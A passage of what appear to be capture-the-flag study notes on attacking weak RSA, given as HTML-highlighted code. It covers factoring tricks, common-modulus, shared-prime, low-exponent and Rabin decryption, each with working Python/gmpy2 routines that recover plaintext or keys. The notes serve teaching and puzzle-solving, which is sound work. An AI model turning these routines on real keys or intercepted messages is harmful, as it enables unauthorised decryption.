class="line">              <span class="number">227</span>, <span class="number">229</span>, <span class="number">233</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">251</span>, <span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>,</span><br><span class="line">              <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>, <span class="number">379</span>, <span class="number">383</span>, <span class="number">389</span>, <span class="number">397</span>, <span class="number">401</span>, <span class="number">409</span>, <span class="number">419</span>, <span class="number">421</span>, <span class="number">431</span>, <span class="number">433</span>, <span class="number">439</span>, <span class="number">443</span>, <span class="number">449</span>, <span class="number">457</span>, <span class="number">461</span>, <span class="number">463</span>,</span><br><span class="line">              <span class="number">467</span>, <span class="number">479</span>, <span class="number">487</span>, <span class="number">491</span>, <span class="number">499</span>, <span class="number">503</span>, <span class="number">509</span>, <span class="number">521</span>, <span class="number">523</span>, <span class="number">541</span>, <span class="number">547</span>, <span class="number">557</span>, <span class="number">563</span>, <span class="number">569</span>, <span class="number">571</span>, <span class="number">577</span>, <span class="number">587</span>, <span class="number">593</span>, <span class="number">599</span>, <span class="number">601</span>, <span class="number">607</span>,</span><br><span class="line">              <span class="number">613</span>, <span class="number">617</span>, <span class="number">619</span>, <span class="number">631</span>, <span class="number">641</span>, <span class="number">643</span>, <span class="number">647</span>, <span class="number">653</span>, <span class="number">659</span>, <span class="number">661</span>, <span class="number">673</span>, <span class="number">677</span>, <span class="number">683</span>, <span class="number">691</span>, <span class="number">701</span>, <span class="number">709</span>, <span class="number">719</span>, <span class="number">727</span>, <span class="number">733</span>, <span class="number">739</span>, <span class="number">743</span>,</span><br><span class="line">              <span class="number">751</span>, <span class="number">757</span>, <span class="number">761</span>, <span class="number">769</span>, <span class="number">773</span>, <span class="number">787</span>, <span class="number">797</span>, <span class="number">809</span>, <span class="number">811</span>, <span class="number">821</span>, <span class="number">823</span>, <span class="number">827</span>, <span class="number">829</span>, <span class="number">839</span>, <span class="number">853</span>, <span class="number">857</span>, <span class="number">859</span>, <span class="number">863</span>, <span class="number">877</span>, <span class="number">881</span>, <span class="number">883</span>,</span><br><span class="line">              <span class="number">887</span>, <span class="number">907</span>, <span class="number">911</span>, <span class="number">919</span>, <span class="number">929</span>, <span class="number">937</span>, <span class="number">941</span>, <span class="number">947</span>, <span class="number">953</span>, <span class="number">967</span>, <span class="number">971</span>, <span class="number">977</span>, <span class="number">983</span>, <span class="number">991</span>, <span class="number">997</span>, <span class="number">1009</span>, <span class="number">1013</span>, <span class="number">1019</span>, <span class="number">1021</span>, <span class="number">1031</span>,</span><br><span class="line">              <span class="number">1033</span>, <span class="number">1039</span>, <span class="number">1049</span>, <span class="number">1051</span>, <span class="number">1061</span>, <span class="number">1063</span>, <span class="number">1069</span>, <span class="number">1087</span>, <span class="number">1091</span>, <span class="number">1093</span>, <span class="number">1097</span>, <span class="number">1103</span>, <span class="number">1109</span>, <span class="number">1117</span>, <span class="number">1123</span>, <span class="number">1129</span>, <span class="number">1151</span>,</span><br><span class="line">              <span class="number">1153</span>, <span class="number">1163</span>, <span class="number">1171</span>, <span class="number">1181</span>, <span class="number">1187</span>, <span class="number">1193</span>, <span class="number">1201</span>, <span class="number">1213</span>, <span class="number">1217</span>, <span class="number">1223</span>, <span class="number">1229</span>, <span class="number">1231</span>, <span class="number">1237</span>, <span class="number">1249</span>, <span class="number">1259</span>, <span class="number">1277</span>, <span class="number">1279</span>,</span><br><span class="line">              <span class="number">1283</span>, <span class="number">1289</span>, <span class="number">1291</span>, <span class="number">1297</span>, <span class="number">1301</span>, <span class="number">1303</span>, <span class="number">1307</span>, <span class="number">1319</span>, <span class="number">1321</span>, <span class="number">1327</span>, <span class="number">1361</span>, <span class="number">1367</span>, <span class="number">1373</span>, <span class="number">1381</span>, <span class="number">1399</span>, <span class="number">1409</span>, <span class="number">1423</span>,</span><br><span class="line">              <span class="number">1427</span>, <span class="number">1429</span>, <span class="number">1433</span>, <span class="number">1439</span>, <span class="number">1447</span>, <span class="number">1451</span>, <span class="number">1453</span>, <span class="number">1459</span>, <span class="number">1471</span>, <span class="number">1481</span>, <span class="number">1483</span>, <span class="number">1487</span>, <span class="number">1489</span>, <span class="number">1493</span>, <span class="number">1499</span>, <span class="number">1511</span>, <span class="number">1523</span>,</span><br><span class="line">              <span class="number">1531</span>, <span class="number">1543</span>, <span class="number">1549</span>, <span class="number">1553</span>, <span class="number">1559</span>, <span class="number">1567</span>, <span class="number">1571</span>, <span class="number">1579</span>, <span class="number">1583</span>, <span class="number">1597</span>, <span class="number">1601</span>, <span class="number">1607</span>, <span class="number">1609</span>, <span class="number">1613</span>, <span class="number">1619</span>, <span class="number">1621</span>, <span class="number">1627</span>,</span><br><span class="line">              <span class="number">1637</span>, <span class="number">1657</span>, <span class="number">1663</span>, <span class="number">1667</span>, <span class="number">1669</span>, <span class="number">1693</span>, <span class="number">1697</span>, <span class="number">1699</span>, <span class="number">1709</span>, <span class="number">1721</span>, <span class="number">1723</span>, <span class="number">1733</span>, <span class="number">1741</span>, <span class="number">1747</span>, <span class="number">1753</span>, <span class="number">1759</span>, <span class="number">1777</span>,</span><br><span class="line">              <span class="number">1783</span>, <span class="number">1787</span>, <span class="number">1789</span>, <span class="number">1801</span>, <span class="number">1811</span>, <span class="number">1823</span>, <span class="number">1831</span>, <span class="number">1847</span>, <span class="number">1861</span>, <span class="number">1867</span>, <span class="number">1871</span>, <span class="number">1873</span>, <span class="number">1877</span>, <span class="number">1879</span>, <span class="number">1889</span>, <span class="number">1901</span>, <span class="number">1907</span>,</span><br><span class="line">              <span class="number">1913</span>, <span class="number">1931</span>, <span class="number">1933</span>, <span class="number">1949</span>, <span class="number">1951</span>, <span class="number">1973</span>, <span class="number">1979</span>, <span class="number">1987</span>, <span class="number">1993</span>, <span class="number">1997</span>, <span class="number">1999</span>, <span class="number">2003</span>, <span class="number">2011</span>, <span class="number">2017</span>, <span class="number">2027</span>, <span class="number">2029</span>, <span class="number">2039</span>,</span><br><span class="line">              <span class="number">2053</span>, <span class="number">2063</span>, <span class="number">2069</span>, <span class="number">2081</span>, <span class="number">2083</span>, <span class="number">2087</span>, <span class="number">2089</span>, <span class="number">2099</span>, <span class="number">2111</span>, <span class="number">2113</span>, <span class="number">2129</span>, <span class="number">2131</span>, <span class="number">2137</span>, <span class="number">2141</span>, <span class="number">2143</span>, <span class="number">2153</span>, <span class="number">2161</span>,</span><br><span class="line">              <span class="number">2179</span>, <span class="number">2203</span>, <span class="number">2207</span>, <span class="number">2213</span>, <span class="number">2221</span>, <span class="number">2237</span>, <span class="number">2239</span>, <span class="number">2243</span>, <span class="number">2251</span>, <span class="number">2267</span>, <span class="number">2269</span>, <span class="number">2273</span>, <span class="number">2281</span>, <span class="number">2287</span>, <span class="number">2293</span>, <span class="number">2297</span>, <span class="number">2309</span>,</span><br><span class="line">              <span class="number">2311</span>, <span class="number">2333</span>, <span class="number">2339</span>, <span class="number">2341</span>, <span class="number">2347</span>, <span class="number">2351</span>, <span class="number">2357</span>, <span class="number">2371</span>, <span class="number">2377</span>, <span class="number">2381</span>, <span class="number">2383</span>, <span class="number">2389</span>, <span class="number">2393</span>, <span class="number">2399</span>, <span class="number">2411</span>, <span class="number">2417</span>, <span class="number">2423</span>,</span><br><span class="line">              <span class="number">2437</span>, <span class="number">2441</span>, <span class="number">2447</span>, <span class="number">2459</span>, <span class="number">2467</span>, <span class="number">2473</span>, <span class="number">2477</span>, <span class="number">2503</span>, <span class="number">2521</span>, <span class="number">2531</span>, <span class="number">2539</span>, <span class="number">2543</span>, <span class="number">2549</span>, <span class="number">2551</span>, <span class="number">2557</span>, <span class="number">2579</span>, <span class="number">2591</span>,</span><br><span class="line">              <span class="number">2593</span>, <span class="number">2609</span>, <span class="number">2617</span>, <span class="number">2621</span>, <span class="number">2633</span>, <span class="number">2647</span>, <span class="number">2657</span>, <span class="number">2659</span>, <span class="number">2663</span>, <span class="number">2671</span>, <span class="number">2677</span>, <span class="number">2683</span>, <span class="number">2687</span>, <span class="number">2689</span>, <span class="number">2693</span>, <span class="number">2699</span>, <span class="number">2707</span>,</span><br><span class="line">              <span class="number">2711</span>, <span class="number">2713</span>, <span class="number">2719</span>, <span class="number">2729</span>, <span class="number">2731</span>, <span class="number">2741</span>, <span class="number">2749</span>, <span class="number">2753</span>, <span class="number">2767</span>, <span class="number">2777</span>, <span class="number">2789</span>, <span class="number">2791</span>, <span class="number">2797</span>, <span class="number">2801</span>, <span class="number">2803</span>, <span class="number">2819</span>, <span class="number">2833</span>,</span><br><span class="line">              <span class="number">2837</span>, <span class="number">2843</span>, <span class="number">2851</span>, <span class="number">2857</span>, <span class="number">2861</span>, <span class="number">2879</span>, <span class="number">2887</span>, <span class="number">2897</span>, <span class="number">2903</span>, <span class="number">2909</span>, <span class="number">2917</span>, <span class="number">2927</span>, <span class="number">2939</span>, <span class="number">2953</span>, <span class="number">2957</span>, <span class="number">2963</span>, <span class="number">2969</span>,</span><br><span class="line">              <span class="number">2971</span>, <span class="number">2999</span>]</span><br><span class="line">    <span class="comment"># print(primes)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, val):</span><br><span class="line">        M = M * primes[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            p = gmpy2.mpz(k * M + (<span class="built_in">pow</span>(<span class="number">65537</span>, a, M)))</span><br><span class="line">            <span class="keyword">if</span> gmpy2.is_prime(p):</span><br><span class="line">                q = gmpy2.mpz(n // p)</span><br><span class="line">                <span class="keyword">if</span> gmpy2.is_prime(q):</span><br><span class="line">                    <span class="keyword">return</span> p, q</span><br><span class="line">                    <span class="comment"># print(q)</span></span><br></pre></td></tr></table></figure>

<h3 id="xor-factorization"><a href="#xor-factorization" class="headerlink" title="xor factorization"></a>xor factorization</h3><blockquote>
<p><a href="https://github.com/sliedes/xor_factor">GitHub - sliedes&#x2F;xor_factor: Given p xor q and n&#x3D;p*q for two unknown primes p and q, factor n and output p and q.</a></p>
</blockquote>
<p><strong>usage</strong></p>
<p><code>xor_factor.py n x</code></p>
<h3 id="pollard’s-p-1"><a href="#pollard’s-p-1" class="headerlink" title="pollard’s p-1"></a>pollard’s p-1</h3><blockquote>
<p>This part only give the solution. </p>
<p>Detailed introduction needs time to be written.  </p>
</blockquote>
<p>$$<br>(p-1) | B!\<br>$$</p>
<p>$$<br>2^{B!}\equiv 1 \mod p<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> pollard_pm1</span><br><span class="line">p = pollard_pm1(n)</span><br><span class="line"><span class="comment"># May it cost a lot of time, just wait. </span></span><br></pre></td></tr></table></figure>

<h3 id="williams’s-p-1"><a href="#williams’s-p-1" class="headerlink" title="williams’s p+1"></a>williams’s p+1</h3><blockquote>
<p>As above. </p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> williams_pp1</span><br><span class="line">p = williams_pp1(n)</span><br><span class="line"><span class="comment"># Similar to Pollard&#x27;s p-1</span></span><br></pre></td></tr></table></figure>



<h3 id="known-phi"><a href="#known-phi" class="headerlink" title="known phi"></a>known phi</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> is_prime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method only works for a modulus consisting of 2 primes!</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors, or None if the factors were not found</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s = N + <span class="number">1</span> - phi</span><br><span class="line">    d = s ** <span class="number">2</span> - <span class="number">4</span> * N</span><br><span class="line">    p = <span class="built_in">int</span>(s - isqrt(d)) // <span class="number">2</span></span><br><span class="line">    q = <span class="built_in">int</span>(s + isqrt(d)) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize_multi_prime</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method works for a modulus consisting of any number of primes, but is considerably be slower than factorize.</span></span><br><span class="line"><span class="string">    More information: Hinek M. J., Low M. K., Teske E., &quot;On Some Attacks on Multi-prime RSA&quot; (Section 3)</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    prime_factors = <span class="built_in">set</span>()</span><br><span class="line">    factors = [N]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(factors) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># Element to factorize.</span></span><br><span class="line">        N = factors[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        w = randrange(<span class="number">2</span>, N - <span class="number">1</span>)</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> phi % (<span class="number">2</span> ** i) == <span class="number">0</span>:</span><br><span class="line">            sqrt_1 = <span class="built_in">pow</span>(w, phi // (<span class="number">2</span> ** i), N)</span><br><span class="line">            <span class="keyword">if</span> sqrt_1 &gt; <span class="number">1</span> <span class="keyword">and</span> sqrt_1 != N - <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># We can remove the element to factorize now, because we have a factorization.</span></span><br><span class="line">                factors = factors[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                p = gcd(N, sqrt_1 + <span class="number">1</span>)</span><br><span class="line">                q = N // p</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(p):</span><br><span class="line">                    prime_factors.add(p)</span><br><span class="line">                <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(p)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(q):</span><br><span class="line">                    prime_factors.add(q)</span><br><span class="line">                <span class="keyword">elif</span> q &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(q)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Continue in the outer loop</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(prime_factors)</span><br></pre></td></tr></table></figure>



<h2 id="sage"><a href="#sage" class="headerlink" title="sage"></a>sage</h2><h3 id="n-x3D-a-2-b-2"><a href="#n-x3D-a-2-b-2" class="headerlink" title="$n &#x3D; a^2 + b^2$"></a>$n &#x3D; a^2 + b^2$</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">two_squares(n)</span><br></pre></td></tr></table></figure>

<h3 id="n-x3D-a-2-b-2-c-2"><a href="#n-x3D-a-2-b-2-c-2" class="headerlink" title="$n &#x3D; a^2 + b^2 + c^2$"></a>$n &#x3D; a^2 + b^2 + c^2$</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">three_squares(n)</span><br></pre></td></tr></table></figure>

<h3 id="Quadratic-Sieve"><a href="#Quadratic-Sieve" class="headerlink" title="Quadratic Sieve"></a>Quadratic Sieve</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">qsieve()</span><br></pre></td></tr></table></figure>

<h3 id="find-prime-factors"><a href="#find-prime-factors" class="headerlink" title="find prime factors"></a>find prime factors</h3><ul>
<li>elliptic curve factorize</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ecm()</span><br></pre></td></tr></table></figure>

<ul>
<li>just prime factorize</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prime_divisors()</span><br></pre></td></tr></table></figure>





<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><blockquote>
<p><a href="http://mathmu.github.io/MTCAS/doc/IntegerFactorization.html">整数因子分解 - maTHμ - 计算机代数系统 (mathmu.github.io)</a></p>
</blockquote>
<ul>
<li>lenstra elliptic curve factorization</li>
<li>birthday attack</li>
<li>……</li>
</ul>
<h1 id="SAME-MOD"><a href="#SAME-MOD" class="headerlink" title="SAME MOD"></a>SAME MOD</h1><p>The attack is based on the <strong>Homomorphic Encryption</strong> and <strong>Extended Euclidean Algorithm</strong>.</p>
<blockquote>
<p>Usually, we have two pairs of $c$ and $e$ and both them have the same modulo. </p>
<p>*REMEMBER that the encrypted m should be same. *</p>
</blockquote>
<p>$$<br>c_{1} \equiv m^{e_{1}} \mod n\<br>$$</p>
<p>$$<br>c_{2} \equiv m^{e_{2}} \mod n<br>$$</p>
<p>Use Extended Euclidean Algorithm, the eqution follows:<br>$$<br>r \times e_{1} + s \times e_{2} &#x3D; gcd(e1, e2)<br>$$<br>Based on the <code>Multiplicative homomorphism</code>, and we can make a conversion.</p>
<p>$$<br>c_{1}^{s} \times c_{2}^{r} \equiv m^{r\times e_{1} + s\times e_{2}} \mod n<br>$$</p>
<h2 id="e-1-e-2-are-primes"><a href="#e-1-e-2-are-primes" class="headerlink" title="$e_{1}$, $e_{2}$ are primes"></a>$e_{1}$, $e_{2}$ are primes</h2><p>If $e_{1}$ and $e_{2}$ are primes, $gcd(e_{1}, e_{2}) &#x3D; 1$, and we can substitute the integer into the equation above.<br>$$<br>c_{1}^{s} \times c_{2}^{r} \equiv m \mod n<br>$$</p>
<h2 id="e-1-e-2-not-primes"><a href="#e-1-e-2-not-primes" class="headerlink" title="$e_{1}$, $e_{2}$ not primes"></a>$e_{1}$, $e_{2}$ not primes</h2><ol>
<li>$gcd(e1, e2)$ and $\varphi(n)$ are not relatively-prime.</li>
</ol>
<p>May use <code>Rabin Algorithm</code> to solve this problem. For another word, the problem converts to the <code>Low_Exponent_e2</code> problem. </p>
<ol start="2">
<li>$gcd(e1, e2)$ and $\varphi(n)$ are relatively-prime.</li>
</ol>
<p>Thus,  just use <code>iroot(m, g)</code> and we get the true $m$. <strong>REMEMBER</strong> that before the calculation we ought to <code> % n</code> first. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Same_Mod_RSA</span>(<span class="params">e1, e2, c1, c2, n</span>):</span><br><span class="line">    g, r, s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="keyword">if</span> r &lt; <span class="number">0</span>:</span><br><span class="line">        r = -r</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s &lt; <span class="number">0</span>:</span><br><span class="line">        s = -s</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = gmpy2.powmod(c1, r, n)*gmpy2.powmod(c2, s, n) % n <span class="comment"># keypoint</span></span><br><span class="line">    <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> m</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gmpy2.iroot(m, g)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p><em>The code ignores that gcd($e_{1}$, $e_{2}$) and $\varphi(n)$ are not relatively-prime</em>.</p>
<h2 id="Multiplicative-congruence"><a href="#Multiplicative-congruence" class="headerlink" title="Multiplicative congruence"></a>Multiplicative congruence</h2><p>We use multiplicative congruence to simplify our calculation. </p>
<p>It usually gives us one same modulo $n$ and two more pairs of $c$, $e$. </p>
<p><strong>FOR EXAMPLE</strong>: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N = </span><br><span class="line">c1 = </span><br><span class="line">e1 = </span><br><span class="line">c2 = </span><br><span class="line">e2 = </span><br><span class="line">c3 = </span><br><span class="line">e3 = </span><br></pre></td></tr></table></figure>

<p>The deduction is as follows:<br>$$<br>g_{1} \equiv e_{1} \cdot r_{1} + e_{2} \cdot s_{1} \<br>$$<br>$$<br>g_{2} \equiv g_{1} \cdot r_{2} + e_{3} \cdot s_{2}<br>$$</p>
<p>The three public keys satisfy $gcd(e_{1}, e_{2}, e_{3}) &#x3D; 1$, so $g_{2} &#x3D; 1$. </p>
<p>We can get the equation that $1\equiv (e_{1}\cdot r_{1} + e_{2} \cdot s_{1})\cdot r_{2} + e_{3} \cdot s_{2}$.</p>
<p>Expand it:<br>$$<br>1 \equiv (r_2\cdot r_1)\cdot e_1 + (s_1 \cdot r_2)\cdot e_2 + s_2\cdot e_3<br>$$</p>
<p>$$<br>c_1 \equiv m^{e_1} \mod n<br>$$</p>
<p>$$<br>c_2 \equiv m^{e_2} \mod n \<br>$$</p>
<p>$$<br>c_3 \equiv m^{e_3} \mod n \<br>$$</p>
<p>$$<br>\Longrightarrow c_1^{r_2\cdot r_1}\cdot c_2^{s_1\cdot r_2} \cdot c_3^{s_2} \equiv m \mod n<br>$$</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">g1, r1, s1 = gcdext(e1, e2)</span><br><span class="line">g2, r2, s2 = gcdext(g1, e3)</span><br><span class="line"><span class="comment"># print(g2)</span></span><br><span class="line">m = powmod(c1, r2*r1, n)*powmod(c2, s1*r2, n)*powmod(c3, s2, n) % n <span class="comment"># keypoint</span></span><br></pre></td></tr></table></figure>



<h1 id="MODULO-RELATED"><a href="#MODULO-RELATED" class="headerlink" title="MODULO RELATED"></a>MODULO RELATED</h1><blockquote>
<p>$n_{1}$ and $n_{2}$ are relatively-primes</p>
<p>When they encrypt the same message $m$，it exists <strong>THE MODULO RELATED ATTACK</strong>.</p>
</blockquote>
<p><strong>Deduction</strong><br>$$<br>n_1 &#x3D; p \times q_1<br>$$</p>
<p>$$<br>n_2 &#x3D; p \times q_2\<br>$$</p>
<p><em>Ignore the possibility that $1 \times n_1$ and $1 \times n_2$</em><br>$$<br>p &#x3D; gcd(n_1, n_2) \<br>$$</p>
<p>$$<br>q_1 &#x3D; n_1 &#x2F;&#x2F; p<br>$$</p>
<p>$$<br>q_2 &#x3D; n_2 &#x2F;&#x2F; p<br>$$</p>
<p>$ p$ can be calculated with function <code>gcd()</code> , and  use division to solve out the $q_1$ and $q_2$.</p>
<p>The problem converts to the <code>Original_RSA</code>.</p>
<p><strong>Solution</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_NPM</span>(<span class="params">n1,n2,e,c1</span>):</span><br><span class="line">    p = gmpy2.gcd(n1,n2)</span><br><span class="line">    q1 = n1//p  <span class="comment"># keypoint</span></span><br><span class="line">    N = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e,<span class="built_in">int</span>(N))</span><br><span class="line">    m = gmpy2.powmod(c1,d,n1)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>

<p><em>Remember that $n_1$ and $c_1$ are one-to-one!</em></p>
<h1 id="LOW-EXPONENT"><a href="#LOW-EXPONENT" class="headerlink" title="LOW EXPONENT"></a>LOW EXPONENT</h1><h2 id="e-x3D-3"><a href="#e-x3D-3" class="headerlink" title="e &#x3D; 3"></a>e &#x3D; 3</h2><blockquote>
<p>or one-to-one function</p>
</blockquote>
<p>JUST Bruck. </p>
<ol>
<li>$m^e &lt; n$, means that $k &#x3D; 0$ in code below</li>
<li>$m^e &gt; n$</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Low_Exponent_e3</span>(<span class="params">c,e,n</span>):</span><br><span class="line">    k = <span class="number">0</span> <span class="comment"># one</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>: <span class="comment"># the other</span></span><br><span class="line">        cm = c + n*k</span><br><span class="line">        m, index = gmpy2.iroot(cm, e)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> m</span><br><span class="line">        k += <span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="e-and-varphi-n-are-not-relatively-prime"><a href="#e-and-varphi-n-are-not-relatively-prime" class="headerlink" title="$e$ and $\varphi(n)$ are not relatively-prime"></a>$e$ and $\varphi(n)$ are not relatively-prime</h2><h3 id="e-x3D-2"><a href="#e-x3D-2" class="headerlink" title="e &#x3D; 2"></a>e &#x3D; 2</h3><blockquote>
<p>Rabin</p>
</blockquote>
<p><strong>PART1</strong> $m_p$ and $m_q$</p>
<p>Split into two scenarios for discussion: </p>
<ol>
<li>$p$ and $q$ are satisfied $p \equiv q \equiv 3 \mod 4$.</li>
</ol>
<p>$$<br>m_p \equiv c^{\frac{1}{4}(p + 1)} \mod p<br>$$</p>
<p>$$<br>m_q \equiv c^{\frac{1}{4}(q + 1)} \mod q<br>$$</p>
<ol start="2">
<li>$p$ and $q$ are different to 1.</li>
</ol>
<p>$$<br>m_p \equiv c^{\frac{1}{2}} \mod p<br>$$</p>
<p>$$<br>m_q \equiv c^{\frac{1}{2}} \mod q<br>$$</p>
<p><strong>PART2</strong> Calculated $y_p$ and $y_q$ with Extended Euclidean Algorithm whose function is <code>gmpy2.gcdext()</code>.<br>$$<br>y_p \cdot p + y_q \cdot q &#x3D; 1<br>$$<br><strong>PART3</strong> Solve out four plaintexts.<br>$$<br>a \equiv (y_p \cdot p \cdot m_q + y_q \cdot q \cdot m_p) \mod n<br>$$</p>
<p>$$<br>b \equiv n - a<br>$$</p>
<p>$$<br>c \equiv (y_p \cdot p \cdot m_q - y_q \cdot q \cdot m_p) \mod n<br>$$</p>
<p>$$<br>d \equiv n - c<br>$$</p>
<p>Thus, we will get four different plaintext, and one of them is the true plaintext. </p>
<p>Here is the complete code: </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Rabin_e2</span>(<span class="params">c,n,p,q</span>):</span><br><span class="line">    mp = gmpy2.powmod(c,(p+<span class="number">1</span>)//<span class="number">4</span>,p)</span><br><span class="line">    mq = gmpy2.powmod(c,(q+<span class="number">1</span>)//<span class="number">4</span>,q)</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mp = gmpy2.powmod(c,1/2,p)</span></span><br><span class="line"><span class="string">    mq = gmpy2.powmod(c,1/2,q)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    gcd,yp,yq = gmpy2.gcdext(p,q)</span><br><span class="line"></span><br><span class="line">    m1 = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    m2 = n - m1</span><br><span class="line">    m3 = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    m4 = n - m3</span><br><span class="line">    <span class="keyword">return</span> m1, m2, m3, m4</span><br></pre></td></tr></table></figure>



<h3 id="e-x3D-2-1"><a href="#e-x3D-2-1" class="headerlink" title="e !&#x3D; 2"></a>e !&#x3D; 2</h3><p>If $e$ is not equal to 2, we use another way to calculate the final $m$. </p>
<p>For example, $gcd(e, \varphi(n)) &#x3D; a$. We can divide $e$ to get the equation $gcd(e&#x2F;&#x2F;a, \varphi(n)) &#x3D; 1$ to solve the private key $d$.</p>
<p>Finally, we get the $m^{a}$. We use <code>iroot($m^&#123;a&#125;$, a)[0]</code> to get the final plaintext $m$.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># We define phi as N</span></span><br><span class="line">a = gcd(e, N)</span><br><span class="line">d = invert(e//a, N)</span><br><span class="line">m = iroot(powmod(c, d, n), a)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>



<h3 id="AMM"><a href="#AMM" class="headerlink" title="AMM"></a>AMM</h3><blockquote>
<p>The same $e$ is too large to solve out.</p>
</blockquote>
